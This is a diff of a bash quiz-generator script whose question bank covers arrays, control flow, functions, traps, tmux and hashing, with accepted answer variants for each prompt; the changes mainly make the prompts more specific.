   questions+=("If ${W}${txt}${C} line count (in variable ${Y}lines${C}) > ${n2}, show first ${n3} lines§lines=\$(wc -l < ${txt}); [[ \$lines -gt ${n2} ]] && head -${n3} ${txt}§lines=\$(wc -l < ${txt}); [[ \$lines -gt ${n2} ]] && head -n ${n3} ${txt}§lines=\$(wc -l < ${txt}); (( lines > ${n2} )) && head -${n3} ${txt}§lines=\$(wc -l < ${txt}); (( lines > ${n2} )) && head -n ${n3} ${txt}§lines=\$(wc -l < ${txt}); [ \$lines -gt ${n2} ] && head -${n3} ${txt}§lines=\$(wc -l < ${txt}); [ \$lines -gt ${n2} ] && head -n ${n3} ${txt}§lines=\$(wc -l < ${txt}); test \$lines -gt ${n2} && head -${n3} ${txt}§lines=\$(wc -l < ${txt}); test \$lines -gt ${n2} && head -n ${n3} ${txt}")
   questions+=("Test if ${W}${txt}${C} has more than ${n2} words§[[ \$(wc -w < ${txt}) -gt ${n2} ]]§[[ \$(wc --words < ${txt}) -gt ${n2} ]]§(( \$(wc -w < ${txt}) > ${n2} ))§(( \$(wc --words < ${txt}) > ${n2} ))§[ \$(wc -w < ${txt}) -gt ${n2} ]§[ \$(wc --words < ${txt}) -gt ${n2} ]§test \$(wc -w < ${txt}) -gt ${n2}§test \$(wc --words < ${txt}) -gt ${n2}")
   questions+=("Test if ${W}${txt}${C} exists AND is readable|[[ -e ${txt} && -r ${txt} ]]|[[ -e ${txt} ]] && [[ -r ${txt} ]]|[ -e ${txt} ] && [ -r ${txt} ]|test -e ${txt} && test -r ${txt}|[[ -f ${txt} && -r ${txt} ]]|[[ -f ${txt} ]] && [[ -r ${txt} ]]|[ -f ${txt} ] && [ -r ${txt} ]|test -f ${txt} && test -r ${txt}")
@@ -2754,7 +2885,7 @@ gen_level15() {
   questions+=("Capture pane output to stdout|tmux capture-pane -p|tmux capturep -p")
   questions+=("Save current tmux pane output to ${W}output.txt${C}§tmux capture-pane -p > output.txt§tmux capturep -p > output.txt")
   questions+=("Run command in new window§tmux new-window 'htop'§tmux neww 'htop'§tmux new-window htop§tmux neww htop§tmux new-window \"htop\"§tmux neww \"htop\"")
-  questions+=("Create session with command§tmux new -s monitor 'htop'§tmux new-session -s monitor 'htop'§tmux new -s monitor htop§tmux new-session -s monitor htop§tmux new -s monitor \"htop\"§tmux new-session -s monitor \"htop\"")
+  questions+=("Create tmux session ${W}monitor${C} running ${W}htop${C}§tmux new -s monitor 'htop'§tmux new-session -s monitor 'htop'§tmux new -s monitor htop§tmux new-session -s monitor htop§tmux new -s monitor \"htop\"§tmux new-session -s monitor \"htop\"")
   questions+=("Pipe pane output from session 'work' to ${W}session.log${C}|tmux pipe-pane -t work 'cat >> session.log'|tmux pipep -t work 'cat >> session.log'")
   questions+=("Keybinding: detach from session|Ctrl+b d|ctrl+b d|C-b d|ctrl-b d|Ctrl-b d")
   questions+=("Keybinding: split pane left/right|Ctrl+b %|ctrl+b %|C-b %|ctrl-b %|Ctrl-b %")
@@ -2950,97 +3081,97 @@ gen_level19() {
   questions+=("Lowercase first char of \$var|echo \${var,}")
   questions+=("Use 'default' if \$var is unset|echo \${var:-default}")
   questions+=("Set \$var to 'default' if unset|echo \${var:=default}")
-  questions+=("Error if \$var is unset|echo \${var:?error message}")
+  questions+=("Error ${W}error message${C} if \$var is unset|echo \${var:?error message}")
   questions+=("Use 'alt' if \$var IS set|echo \${var:+alt}")
-  questions+=("Declare indexed array|declare -a arr|arr=()|declare -a arr=()")
+  questions+=("Declare indexed array ${Y}arr${C}|declare -a arr|arr=()|declare -a arr=()")
   questions+=("Create array ${Y}arr${C} with values ${W}one two three${C}|arr=(one two three)")
-  questions+=("Access first element|echo \${arr[0]}")
-  questions+=("Access last element|echo \${arr[-1]}")
-  questions+=("Get all array elements|echo \${arr[@]}|echo \${arr[*]}|echo \"\${arr[@]}\"|echo \"\${arr[*]}\"")
-  questions+=("Get array length|echo \${#arr[@]}|echo \${#arr[*]}")
-  questions+=("Get array indices|echo \${!arr[@]}|echo \${!arr[*]}")
+  questions+=("Access first element of ${Y}arr${C}|echo \${arr[0]}")
+  questions+=("Access last element of ${Y}arr${C}|echo \${arr[-1]}")
+  questions+=("Get all elements of ${Y}arr${C}|echo \${arr[@]}|echo \${arr[*]}|echo \"\${arr[@]}\"|echo \"\${arr[*]}\"")
+  questions+=("Get length of ${Y}arr${C}|echo \${#arr[@]}|echo \${#arr[*]}")
+  questions+=("Get indices of ${Y}arr${C}|echo \${!arr[@]}|echo \${!arr[*]}")
   questions+=("Append ${W}four${C} to array ${Y}arr${C}|arr+=(four)")
-  questions+=("Delete array element at index 1|unset 'arr[1]'|unset arr[1]|unset \"arr[1]\"")
-  questions+=("Slice array: elements 1-3|echo \${arr[@]:1:3}")
-  questions+=("Declare associative array|declare -A map")
+  questions+=("Delete ${Y}arr${C} element at index 1|unset 'arr[1]'|unset arr[1]|unset \"arr[1]\"")
+  questions+=("Slice ${Y}arr${C}: elements 1-3|echo \${arr[@]:1:3}")
+  questions+=("Declare associative array ${Y}map${C}|declare -A map")
   questions+=("Set ${Y}map${C} entry ${W}key${C} to ${W}value${C}|map[key]=value")
   questions+=("Create associative array ${Y}map${C} inline with ${W}k1=v1 k2=v2${C}|declare -A map=([k1]=v1 [k2]=v2)")
-  questions+=("Get associative array value|echo \${map[key]}")
-  questions+=("Get all keys of associative array|echo \${!map[@]}|echo \${!map[*]}")
-  questions+=("Get all values of associative array|echo \${map[@]}|echo \${map[*]}")
-  questions+=("Check if key exists in array|[[ -v map[key] ]]|[[ \${map[key]+x} ]]|[[ -n \${map[key]+x} ]]")
-  questions+=("Reverse an array§for ((i=\${#arr[@]}-1; i>=0; i--)); do echo \"\${arr[\$i]}\"; done§printf '%s\\n' \"\${arr[@]}\" | tac")
-  questions+=("Loop with index|for i in \"\${!arr[@]}\"; do echo \"\$i: \${arr[\$i]}\"; done|for ((i=0; i<\${#arr[@]}; i++)); do echo \"\$i: \${arr[\$i]}\"; done")
-  questions+=("Join array with comma|(IFS=','; echo \"\${arr[*]}\")|( IFS=','; echo \"\${arr[*]}\" )|(IFS=,; echo \"\${arr[*]}\")")
+  questions+=("Get ${Y}map${C} value at key ${W}key${C}|echo \${map[key]}")
+  questions+=("Get all keys of ${Y}map${C}|echo \${!map[@]}|echo \${!map[*]}")
+  questions+=("Get all values of ${Y}map${C}|echo \${map[@]}|echo \${map[*]}")
+  questions+=("Check key ${W}key${C} exists in ${Y}map${C}|[[ -v map[key] ]]|[[ \${map[key]+x} ]]|[[ -n \${map[key]+x} ]]")
+  questions+=("Reverse ${Y}arr${C}§for ((i=\${#arr[@]}-1; i>=0; i--)); do echo \"\${arr[\$i]}\"; done§printf '%s\\n' \"\${arr[@]}\" | tac")
+  questions+=("Loop array with index, printing \"\$i: \${arr[\$i]}\"|for i in \"\${!arr[@]}\"; do echo \"\$i: \${arr[\$i]}\"; done|for ((i=0; i<\${#arr[@]}; i++)); do echo \"\$i: \${arr[\$i]}\"; done")
+  questions+=("Join ${Y}arr${C} with comma|(IFS=','; echo \"\${arr[*]}\")|( IFS=','; echo \"\${arr[*]}\" )|(IFS=,; echo \"\${arr[*]}\")")
   questions+=("Read ${W}${txt}${C} lines into array|mapfile -t arr < ${txt}|readarray -t arr < ${txt}")
-  questions+=("Read command output into array|mapfile -t arr < <(ls)|readarray -t arr < <(ls)")
+  questions+=("Read ${W}ls${C} output into array ${Y}arr${C}|mapfile -t arr < <(ls)|readarray -t arr < <(ls)")
   questions+=("Copy array ${Y}arr${C} into ${Y}arr2${C}|arr2=(\"\${arr[@]}\")")
   questions+=("Merge ${Y}arr1${C} and ${Y}arr2${C} into ${Y}merged${C}|merged=(\"\${arr1[@]}\" \"\${arr2[@]}\")")
   questions+=("Indirect expansion: print value of variable whose NAME is stored in \$ref|echo \"\${!ref}\"|printf '%s\\n' \"\${!ref}\"")
   questions+=("Shell-quote \$var safely for eval re-use (\${var@Q})|echo \"\${var@Q}\"|printf '%q\\n' \"\$var\"")
-  questions+=("Assign printf output to \$var WITHOUT subshell (perf-critical)|printf -v var '%s' \"value\"|printf -v var '%s\\n' \"value\"")
+  questions+=("Assign ${W}value${C} to \$var with printf, no subshell (perf-critical)|printf -v var '%s' \"value\"|printf -v var '%s\\n' \"value\"")
   questions+=("Get current epoch seconds via printf builtin (no subshell, perf)|printf '%(%s)T\\n' -1|printf -v now '%(%s)T' -1")
 }
 
 # Level 20: Control Flow & Functions
 gen_level20() {
   local -n questions=${1:-CURRENT_QUESTIONS}; questions=(); eval "local $_QV"; _ctx
-  questions+=("Basic if statement|if [[ condition ]]; then cmd; fi|if [ condition ]; then cmd; fi|if test condition; then cmd; fi")
-  questions+=("if/else statement|if [[ cond ]]; then cmd1; else cmd2; fi|if [ cond ]; then cmd1; else cmd2; fi|if test cond; then cmd1; else cmd2; fi")
-  questions+=("if/elif/else|if [[ c1 ]]; then cmd1; elif [[ c2 ]]; then cmd2; else cmd3; fi|if [ c1 ]; then cmd1; elif [ c2 ]; then cmd2; else cmd3; fi|if test c1; then cmd1; elif test c2; then cmd2; else cmd3; fi")
+  questions+=("If ${W}condition${C}, run ${W}cmd${C}|if [[ condition ]]; then cmd; fi|if [ condition ]; then cmd; fi|if test condition; then cmd; fi")
+  questions+=("If ${W}cond${C} run ${W}cmd1${C}, else ${W}cmd2${C}|if [[ cond ]]; then cmd1; else cmd2; fi|if [ cond ]; then cmd1; else cmd2; fi|if test cond; then cmd1; else cmd2; fi")
+  questions+=("If ${W}c1${C} run ${W}cmd1${C}, elif ${W}c2${C} run ${W}cmd2${C}, else ${W}cmd3${C}|if [[ c1 ]]; then cmd1; elif [[ c2 ]]; then cmd2; else cmd3; fi|if [ c1 ]; then cmd1; elif [ c2 ]; then cmd2; else cmd3; fi|if test c1; then cmd1; elif test c2; then cmd2; else cmd3; fi")
   questions+=("Test if ${W}${txt}${C} exists and display it|[[ -e ${txt} ]] && cat ${txt}|[ -e ${txt} ] && cat ${txt}|test -e ${txt} && cat ${txt}|[[ -f ${txt} ]] && cat ${txt}|[ -f ${txt} ] && cat ${txt}|test -f ${txt} && cat ${txt}")
-  questions+=("Test if grep finds ${Y}${term}${C} in ${W}${log}${C}|if grep -q ${term} ${log}; then echo found; fi|grep -q ${term} ${log} && echo found|if grep --quiet ${term} ${log}; then echo found; fi|grep --quiet ${term} ${log} && echo found|rg -q ${term} ${log} && echo found|rg --quiet ${term} ${log} && echo found")
-  questions+=("Negate condition in ${W}${txt}${C}§if ! [[ -f ${txt} ]]; then echo missing; fi§if ! [ -f ${txt} ]; then echo missing; fi§if [ ! -f ${txt} ]; then echo missing; fi§if [[ ! -f ${txt} ]]; then echo missing; fi§if ! test -f ${txt}; then echo missing; fi§[[ ! -f ${txt} ]] && echo missing§[[ -f ${txt} ]] || echo missing§[ -f ${txt} ] || echo missing§test -f ${txt} || echo missing")
+  questions+=("Test if grep finds ${Y}${term}${C} in ${W}${log}${C}, echo ${W}found${C}|if grep -q ${term} ${log}; then echo found; fi|grep -q ${term} ${log} && echo found|if grep --quiet ${term} ${log}; then echo found; fi|grep --quiet ${term} ${log} && echo found|rg -q ${term} ${log} && echo found|rg --quiet ${term} ${log} && echo found")
+  questions+=("If ${W}${txt}${C} is NOT a file, echo ${W}missing${C}§if ! [[ -f ${txt} ]]; then echo missing; fi§if ! [ -f ${txt} ]; then echo missing; fi§if [ ! -f ${txt} ]; then echo missing; fi§if [[ ! -f ${txt} ]]; then echo missing; fi§if ! test -f ${txt}; then echo missing; fi§[[ ! -f ${txt} ]] && echo missing§[[ -f ${txt} ]] || echo missing§[ -f ${txt} ] || echo missing§test -f ${txt} || echo missing")
   questions+=("Compound AND condition in ${W}${txt}${C}|if [[ -f ${txt} && -r ${txt} ]]; then cat ${txt}; fi|if [ -f ${txt} ] && [ -r ${txt} ]; then cat ${txt}; fi|[[ -f ${txt} && -r ${txt} ]] && cat ${txt}|[ -f ${txt} ] && [ -r ${txt} ] && cat ${txt}|test -f ${txt} && test -r ${txt} && cat ${txt}")
-  questions+=("Compound OR condition§if [[ -z \"\$var\" || \"\$var\" == \"default\" ]]; then echo empty; fi§if [ -z \"\$var\" ] || [ \"\$var\" = \"default\" ]; then echo empty; fi§if test -z \"\$var\" || test \"\$var\" = \"default\"; then echo empty; fi")
+  questions+=("Compound OR: if \$var is empty or equals \"default\", echo empty§if [[ -z \"\$var\" || \"\$var\" == \"default\" ]]; then echo empty; fi§if [ -z \"\$var\" ] || [ \"\$var\" = \"default\" ]; then echo empty; fi§if test -z \"\$var\" || test \"\$var\" = \"default\"; then echo empty; fi")
   questions+=("Loop over .${ext} files in current dir, echoing ${Y}Processing \$f${C} for each|for f in *.${ext}; do echo \"Processing \$f\"; done|for f in *.${ext}; do echo \"Processing \${f}\"; done")
-  questions+=("Rename all .txt to .bak|for f in *.txt; do mv \"\$f\" \"\${f%.txt}.bak\"; done")
-  questions+=("Retry curl until success (max ${n} tries)|for i in \$(seq 1 ${n}); do curl -s url && break; sleep 1; done|for i in \$(seq ${n}); do curl -s url && break; sleep 1; done|for ((i=1; i<=${n}; i++)); do curl -s url && break; sleep 1; done")
+  questions+=("Rename all .txt to .bak, loop var ${Y}f${C}|for f in *.txt; do mv \"\$f\" \"\${f%.txt}.bak\"; done")
+  questions+=("Retry ${W}curl -s url${C} until success with ${Y}i${C} (max ${n} tries, sleep 1)|for i in \$(seq 1 ${n}); do curl -s url && break; sleep 1; done|for i in \$(seq ${n}); do curl -s url && break; sleep 1; done|for ((i=1; i<=${n}; i++)); do curl -s url && break; sleep 1; done")
   questions+=("Loop over hosts ${Y}srv1 srv2 srv3${C}, run ${Y}uptime${C} over ssh (2s connect timeout)|for h in srv1 srv2 srv3; do ssh -o ConnectTimeout=2 \$h uptime; done")
-  questions+=("Loop file1 to file${n}, cat each one|for i in \$(seq 1 ${n}); do cat file\$i; done|for i in \$(seq ${n}); do cat file\$i; done|for ((i=1; i<=${n}; i++)); do cat file\$i; done")
-  questions+=("C-style countdown from ${n}|for ((i=${n}; i>0; i--)); do echo \$i; done|for ((i=${n}; i>=1; i--)); do echo \$i; done")
-  questions+=("Loop over array elements|for item in \"\${arr[@]}\"; do echo \"\$item\"; done|for item in \"\${arr[@]}\"; do echo \"\${item}\"; done")
-  questions+=("Loop over files in ${dir}/, skip dirs|for f in ${dir}/*; do [[ -f \"\$f\" ]] && echo \"\$f\"; done|for f in ${dir}/*; do [ -f \"\$f\" ] && echo \"\$f\"; done|for f in ${dir}/*; do test -f \"\$f\" && echo \"\$f\"; done")
-  questions+=("Basic while loop|while [[ condition ]]; do cmd; done|while [ condition ]; do cmd; done|while test condition; do cmd; done")
+  questions+=("Loop ${Y}i${C} 1 to ${n}, cat file${Y}\$i${C} each time|for i in \$(seq 1 ${n}); do cat file\$i; done|for i in \$(seq ${n}); do cat file\$i; done|for ((i=1; i<=${n}; i++)); do cat file\$i; done")
+  questions+=("C-style countdown from ${n} using ${Y}i${C}|for ((i=${n}; i>0; i--)); do echo \$i; done|for ((i=${n}; i>=1; i--)); do echo \$i; done")
+  questions+=("Loop over ${Y}arr${C} elements as ${Y}item${C}, echo each|for item in \"\${arr[@]}\"; do echo \"\$item\"; done|for item in \"\${arr[@]}\"; do echo \"\${item}\"; done")
+  questions+=("Loop ${Y}f${C} over files in ${dir}/, echo each, skip dirs|for f in ${dir}/*; do [[ -f \"\$f\" ]] && echo \"\$f\"; done|for f in ${dir}/*; do [ -f \"\$f\" ] && echo \"\$f\"; done|for f in ${dir}/*; do test -f \"\$f\" && echo \"\$f\"; done")
+  questions+=("While ${W}condition${C}, run ${W}cmd${C}|while [[ condition ]]; do cmd; done|while [ condition ]; do cmd; done|while test condition; do cmd; done")
   questions+=("While read lines from ${W}${txt}${C}|while IFS= read -r line; do echo \"\$line\"; done < ${txt}|while read -r line; do echo \"\$line\"; done < ${txt}")
   questions+=("While loop, counter ${Y}i${C} from 0 to ${n}|i=0; while ((i < ${n})); do echo \$i; ((i++)); done|i=0; while [[ \$i -lt ${n} ]]; do echo \$i; ((i++)); done|i=0; while [ \$i -lt ${n} ]; do echo \$i; ((i++)); done")
-  questions+=("Infinite loop with break|while true; do cmd; [[ cond ]] && break; done|while true; do cmd; [ cond ] && break; done|while true; do cmd; test cond && break; done|while :; do cmd; [[ cond ]] && break; done|while :; do cmd; [ cond ] && break; done|while :; do cmd; test cond && break; done|for ((;;)); do cmd; [[ cond ]] && break; done")
+  questions+=("Loop ${W}cmd${C} forever, break when ${W}cond${C}|while true; do cmd; [[ cond ]] && break; done|while true; do cmd; [ cond ] && break; done|while true; do cmd; test cond && break; done|while :; do cmd; [[ cond ]] && break; done|while :; do cmd; [ cond ] && break; done|while :; do cmd; test cond && break; done|for ((;;)); do cmd; [[ cond ]] && break; done")
   questions+=("While with continue, read from ${W}${txt}${C}|while read -r line; do [[ -z \"\$line\" ]] && continue; echo \"\$line\"; done < ${txt}|while read -r line; do [ -z \"\$line\" ] && continue; echo \"\$line\"; done < ${txt}|while read -r line; do test -z \"\$line\" && continue; echo \"\$line\"; done < ${txt}")
-  questions+=("Read command output line by line§while IFS= read -r line; do echo \"\$line\"; done < <(ls -la)§ls -la | while IFS= read -r line; do echo \"\$line\"; done")
+  questions+=("Read ${W}ls -la${C} output line by line§while IFS= read -r line; do echo \"\$line\"; done < <(ls -la)§ls -la | while IFS= read -r line; do echo \"\$line\"; done")
   questions+=("Until ${W}${txt}${C} exists (opposite of while)|until [[ -e ${txt} ]]; do sleep 1; done|until [ -e ${txt} ]; do sleep 1; done|until test -e ${txt}; do sleep 1; done|until [[ -f ${txt} ]]; do sleep 1; done|until [ -f ${txt} ]; do sleep 1; done|until test -f ${txt}; do sleep 1; done")
-  questions+=("Basic case statement|case \"\$var\" in a) echo A;; b) echo B;; *) echo other;; esac")
-  questions+=("Case with multiple patterns|case \"\$ext\" in sh|bash) echo shell;; py) echo python;; *) echo other;; esac")
-  questions+=("Case for yes/no input|case \"\$ans\" in [Yy]*) echo yes;; [Nn]*) echo no;; *) echo invalid;; esac")
-  questions+=("Case with glob patterns|case \"\$file\" in *.txt) echo text;; *.sh) echo script;; esac")
-  questions+=("Define simple function|func() { echo hello; }|func () { echo hello; }|function func { echo hello; }|function func() { echo hello; }|function func () { echo hello; }")
-  questions+=("Function with local variable|func() { local x=5; echo \$x; }|func () { local x=5; echo \$x; }|function func { local x=5; echo \$x; }|function func() { local x=5; echo \$x; }|function func () { local x=5; echo \$x; }")
-  questions+=("Function with arguments|func() { echo \"arg1: \$1, arg2: \$2\"; }|func () { echo \"arg1: \$1, arg2: \$2\"; }|function func { echo \"arg1: \$1, arg2: \$2\"; }|function func() { echo \"arg1: \$1, arg2: \$2\"; }|function func () { echo \"arg1: \$1, arg2: \$2\"; }")
-  questions+=("Function with return value|func() { return 0; }; func && echo success|func () { return 0; }; func && echo success|function func { return 0; }; func && echo success|function func() { return 0; }; func && echo success|function func () { return 0; }; func && echo success")
-  questions+=("Function returning string via stdout|func() { echo result; }; var=\$(func)|func () { echo result; }; var=\$(func)|function func { echo result; }; var=\$(func)|function func() { echo result; }; var=\$(func)|function func () { echo result; }; var=\$(func)")
-  questions+=("Function with all args|func() { echo \"all args: \$@\"; }|func () { echo \"all args: \$@\"; }|function func { echo \"all args: \$@\"; }|function func() { echo \"all args: \$@\"; }|function func () { echo \"all args: \$@\"; }")
-  questions+=("Function with arg count|func() { echo \"got \$# args\"; }|func () { echo \"got \$# args\"; }|function func { echo \"got \$# args\"; }|function func() { echo \"got \$# args\"; }|function func () { echo \"got \$# args\"; }")
-  questions+=("Check function exists|declare -F func &>/dev/null && echo exists|type func &>/dev/null && echo exists|declare -F func >/dev/null 2>&1 && echo exists|type func >/dev/null 2>&1 && echo exists")
-  questions+=("Unset function|unset -f func")
-  questions+=("Trap SIGINT (Ctrl+C)|trap 'echo caught' SIGINT|trap 'echo caught' INT|trap 'echo caught' 2|trap \"echo caught\" SIGINT|trap \"echo caught\" INT|trap \"echo caught\" 2")
-  questions+=("Trap EXIT for cleanup|trap 'rm -f /tmp/lock' EXIT|trap 'rm -f /tmp/lock' 0|trap \"rm -f /tmp/lock\" EXIT|trap \"rm -f /tmp/lock\" 0")
-  questions+=("Trap multiple signals|trap 'cleanup' SIGINT SIGTERM EXIT|trap 'cleanup' INT TERM EXIT|trap 'cleanup' 2 15 0|trap 'cleanup' EXIT SIGINT SIGTERM|trap 'cleanup' EXIT INT TERM|trap 'cleanup' 0 2 15|trap 'cleanup' SIGTERM SIGINT EXIT|trap 'cleanup' SIGTERM EXIT SIGINT|trap 'cleanup' INT EXIT TERM|trap 'cleanup' TERM INT EXIT|trap 'cleanup' TERM EXIT INT|trap 'cleanup' 0 15 2|trap 'cleanup' 15 2 0|trap 'cleanup' 15 0 2|trap 'cleanup' 2 0 15#boss-skip")
-  questions+=("Trap ERR for error handling|trap 'echo error at line \$LINENO' ERR")
+  questions+=("Case ${Y}\$var${C}: a) echo A, b) echo B, else echo other|case \"\$var\" in a) echo A;; b) echo B;; *) echo other;; esac")
+  questions+=("Case ${Y}\$ext${C}: sh or bash) echo shell, py) echo python, else echo other|case \"\$ext\" in sh|bash) echo shell;; py) echo python;; *) echo other;; esac")
+  questions+=("Case ${Y}\$ans${C}: [Yy]*) echo yes, [Nn]*) echo no, else echo invalid|case \"\$ans\" in [Yy]*) echo yes;; [Nn]*) echo no;; *) echo invalid;; esac")
+  questions+=("Case ${Y}\$file${C}: *.txt) echo text, *.sh) echo script|case \"\$file\" in *.txt) echo text;; *.sh) echo script;; esac")
+  questions+=("Define function ${W}func${C} that echoes ${W}hello${C}|func() { echo hello; }|func () { echo hello; }|function func { echo hello; }|function func() { echo hello; }|function func () { echo hello; }")
+  questions+=("Function ${W}func${C} with local ${Y}x${C}=5, echo it|func() { local x=5; echo \$x; }|func () { local x=5; echo \$x; }|function func { local x=5; echo \$x; }|function func() { local x=5; echo \$x; }|function func () { local x=5; echo \$x; }")
+  questions+=("Function ${W}func${C} printing \"arg1: \$1, arg2: \$2\"|func() { echo \"arg1: \$1, arg2: \$2\"; }|func () { echo \"arg1: \$1, arg2: \$2\"; }|function func { echo \"arg1: \$1, arg2: \$2\"; }|function func() { echo \"arg1: \$1, arg2: \$2\"; }|function func () { echo \"arg1: \$1, arg2: \$2\"; }")
+  questions+=("Function ${W}func${C} returning 0, then echo ${W}success${C} if it ran ok|func() { return 0; }; func && echo success|func () { return 0; }; func && echo success|function func { return 0; }; func && echo success|function func() { return 0; }; func && echo success|function func () { return 0; }; func && echo success")
+  questions+=("Function ${W}func${C} echoing ${W}result${C}, capture into ${Y}var${C}|func() { echo result; }; var=\$(func)|func () { echo result; }; var=\$(func)|function func { echo result; }; var=\$(func)|function func() { echo result; }; var=\$(func)|function func () { echo result; }; var=\$(func)")
+  questions+=("Function ${W}func${C} printing \"all args: \$@\"|func() { echo \"all args: \$@\"; }|func () { echo \"all args: \$@\"; }|function func { echo \"all args: \$@\"; }|function func() { echo \"all args: \$@\"; }|function func () { echo \"all args: \$@\"; }")
+  questions+=("Function ${W}func${C} printing \"got \$# args\"|func() { echo \"got \$# args\"; }|func () { echo \"got \$# args\"; }|function func { echo \"got \$# args\"; }|function func() { echo \"got \$# args\"; }|function func () { echo \"got \$# args\"; }")
+  questions+=("Check function ${W}func${C} exists, echo ${W}exists${C}|declare -F func &>/dev/null && echo exists|type func &>/dev/null && echo exists|declare -F func >/dev/null 2>&1 && echo exists|type func >/dev/null 2>&1 && echo exists")
+  questions+=("Unset function ${W}func${C}|unset -f func")
+  questions+=("Trap SIGINT (Ctrl+C) to echo ${W}caught${C}|trap 'echo caught' SIGINT|trap 'echo caught' INT|trap 'echo caught' 2|trap \"echo caught\" SIGINT|trap \"echo caught\" INT|trap \"echo caught\" 2")
+  questions+=("Trap EXIT to rm -f ${W}/tmp/lock${C}|trap 'rm -f /tmp/lock' EXIT|trap 'rm -f /tmp/lock' 0|trap \"rm -f /tmp/lock\" EXIT|trap \"rm -f /tmp/lock\" 0")
+  questions+=("Trap SIGINT, SIGTERM and EXIT to run ${W}cleanup${C}|trap 'cleanup' SIGINT SIGTERM EXIT|trap 'cleanup' INT TERM EXIT|trap 'cleanup' 2 15 0|trap 'cleanup' EXIT SIGINT SIGTERM|trap 'cleanup' EXIT INT TERM|trap 'cleanup' 0 2 15|trap 'cleanup' SIGTERM SIGINT EXIT|trap 'cleanup' SIGTERM EXIT SIGINT|trap 'cleanup' INT EXIT TERM|trap 'cleanup' TERM INT EXIT|trap 'cleanup' TERM EXIT INT|trap 'cleanup' 0 15 2|trap 'cleanup' 15 2 0|trap 'cleanup' 15 0 2|trap 'cleanup' 2 0 15#boss-skip")
+  questions+=("Trap ERR to echo ${W}error at line \$LINENO${C}|trap 'echo error at line \$LINENO' ERR")
   questions+=("Exit on any error|set -e|set -o errexit")
   questions+=("Exit on undefined variable|set -u|set -o nounset")
   questions+=("Fail on pipe error|set -o pipefail")
   questions+=("Strict mode combo|set -euo pipefail|set -ueo pipefail|set -o errexit -o nounset -o pipefail|set -eu -o pipefail|set -ue -o pipefail|set -o pipefail -o errexit -o nounset|set -o nounset -o pipefail -o errexit|set -o errexit -o pipefail -o nounset|set -o nounset -o errexit -o pipefail|set -o pipefail -o nounset -o errexit#boss-skip")
-  questions+=("Check last command status|[[ \$? -ne 0 ]] && echo failed|[ \$? -ne 0 ] && echo failed|test \$? -ne 0 && echo failed|(( \$? != 0 )) && echo failed|(( \$? )) && echo failed")
-  questions+=("Run command, ignore failure§grep pattern file || true§grep pattern file || :")
-  questions+=("Die function|die() { echo \"\$1\" >&2; exit 1; }|die () { echo \"\$1\" >&2; exit 1; }|function die { echo \"\$1\" >&2; exit 1; }|function die() { echo \"\$1\" >&2; exit 1; }|function die () { echo \"\$1\" >&2; exit 1; }")
+  questions+=("If the last command failed, echo ${W}failed${C}|[[ \$? -ne 0 ]] && echo failed|[ \$? -ne 0 ] && echo failed|test \$? -ne 0 && echo failed|(( \$? != 0 )) && echo failed|(( \$? )) && echo failed")
+  questions+=("Run ${W}grep pattern file${C}, ignore failure§grep pattern file || true§grep pattern file || :")
+  questions+=("Function ${W}die${C}: print \$1 to stderr, exit 1|die() { echo \"\$1\" >&2; exit 1; }|die () { echo \"\$1\" >&2; exit 1; }|function die { echo \"\$1\" >&2; exit 1; }|function die() { echo \"\$1\" >&2; exit 1; }|function die () { echo \"\$1\" >&2; exit 1; }")
   questions+=("Enable debug mode (print commands)|set -x|set -o xtrace")
   questions+=("Disable debug mode|set +x|set +o xtrace")
   questions+=("Interactive menu with select: options ${Y}${term}${C} ${term2} quit|select opt in ${term} ${term2} quit; do [[ \"\$opt\" == quit ]] && break; echo \"\$opt\"; done")
-  questions+=("Parse -v flag and -f arg with getopts§while getopts \"vf:\" opt; do case \$opt in v) verbose=1;; f) file=\$OPTARG;; esac; done§while getopts ':vf:' opt; do case \$opt in v) verbose=1;; f) file=\$OPTARG;; esac; done")
+  questions+=("getopts: -v sets ${Y}verbose${C}=1, -f sets ${Y}file${C}=${Y}\$OPTARG${C}§while getopts \"vf:\" opt; do case \$opt in v) verbose=1;; f) file=\$OPTARG;; esac; done§while getopts ':vf:' opt; do case \$opt in v) verbose=1;; f) file=\$OPTARG;; esac; done")
   # § delimiter: the third alternate contains '||' which a |-split would fragment
   questions+=("Branch on arithmetic test: if ${n} > 0 echo positive§(( ${n} > 0 )) && echo positive§(( ${n} > 0 )) && echo positive || echo nonpositive")
   questions+=("Default value if var unset|echo \"\${var:-default}\"|: \"\${var:=default}\" && echo \"\$var\"")
   questions+=("Loop over script positional args (for x; do - implicit \$@)|for arg; do echo \"\$arg\"; done|for arg in \"\$@\"; do echo \"\$arg\"; done")
-  questions+=("Loop ${W}1..${n}${C} via brace expansion (no seq subshell)|for i in {1..${n}}; do echo \$i; done|for i in {1..${n}}; do echo \"\$i\"; done")
+  questions+=("Loop ${Y}i${C} over ${W}1..${n}${C} via brace expansion (no seq subshell), echo each|for i in {1..${n}}; do echo \$i; done|for i in {1..${n}}; do echo \"\$i\"; done")
   questions+=("Break out of TWO nested loops (over *.${ext} then *.${ext2}) at once via depth arg|for f in *.${ext}; do for g in *.${ext2}; do [[ \"\$g\" == \"\$f\" ]] && break 2; done; done")
   questions+=("Regex match in [[ ]], capture into \${BASH_REMATCH[@]}|[[ \"\$var\" =~ ^([0-9]+)\$ ]] && echo \"\${BASH_REMATCH[1]}\"|[[ \$var =~ ^([0-9]+)\$ ]] && echo \"\${BASH_REMATCH[1]}\"")
 }
@@ -3489,7 +3620,7 @@ gen_level27() {
   questions+=("Generate SHA256 hash of string 'password'§echo -n 'password' | sha256sum§echo -n \"password\" | sha256sum§echo -n password | sha256sum§printf 'password' | sha256sum§printf password | sha256sum§printf '%s' 'password' | sha256sum§printf '%s' password | sha256sum§printf '%s' \"password\" | sha256sum§printf \"%s\" \"password\" | sha256sum§echo -n 'password' | openssl sha256§echo -n password | openssl sha256§printf 'password' | openssl sha256§printf password | openssl sha256§echo -n 'password' | openssl dgst -sha256§echo -n password | openssl dgst -sha256§printf 'password' | openssl dgst -sha256§printf password | openssl dgst -sha256")
   questions+=("Generate SHA256 hash of file ${W}${hash}${C}|sha256sum ${hash}|sha256sum < ${hash}|shasum -a 256 ${hash}|openssl dgst -sha256 ${hash}|openssl sha256 ${hash}")
   questions+=("Convert 'hello' to hex§echo -n 'hello' | xxd -p§echo -n \"hello\" | xxd -p§echo -n hello | xxd -p§printf 'hello' | xxd -p§printf hello | xxd -p§printf '%s' 'hello' | xxd -p§printf '%s' hello | xxd -p§printf '%s' \"hello\" | xxd -p§printf \"%s\" \"hello\" | xxd -p§printf \"%s\" hello | xxd -p")
